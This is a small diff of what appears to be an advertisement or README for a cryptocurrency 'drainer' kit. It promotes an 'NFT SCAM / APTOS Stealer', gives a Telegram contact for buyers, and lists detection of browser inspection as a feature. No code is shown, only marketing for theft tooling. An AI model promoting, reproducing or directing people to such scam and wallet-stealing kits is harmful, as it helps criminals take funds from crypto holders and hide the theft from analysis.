@@ -2,7 +2,7 @@
 NEW DRAINER
 
 📩 DM us here: https://t.me/CresusETH 
-💧 NFT SCAM /APTOS Stealer / NEW!!
+💧 NFT SCAM /APTOS Stealer / NEW!!!
 
 🛡️ Features
  Inspect Element Detection
